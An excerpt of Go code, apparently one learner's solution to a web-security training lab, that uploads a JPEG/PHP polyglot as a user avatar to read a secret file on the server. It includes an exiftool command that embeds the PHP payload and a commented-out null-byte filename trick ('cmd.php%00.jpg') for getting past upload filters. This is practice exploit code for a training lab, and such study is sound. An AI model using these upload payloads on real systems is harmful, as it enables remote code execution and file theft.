...
func solve() error {
	// Prepare polyglot.php image:
	// exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" universe235824.jpg -o polyglot.php

	baseUrl := "https://0a95008f033a1adac0f0728100430072.web-security-academy.net"
	loginUrl := baseUrl + "/login"
	//avatarUrl := baseUrl + "/files/avatars/polyglot.php"
	...
	err = postAvatar(
		client, changeAvatarUrl, myUser, csrfToken, "polyglot.php",
		nil,
		//func(b []byte) ([]byte, error) {
		//	b = bytes.Replace(
		//		b,
		//		[]byte("filename=\"cmd.php\""),
		//		[]byte("filename=\"cmd.php%00.jpg\""),
		//		1,
		//	)
		//	return b, nil
		//},
	...
	// curl {baseUrl}/files/avatars/polyglot.php --output - | head
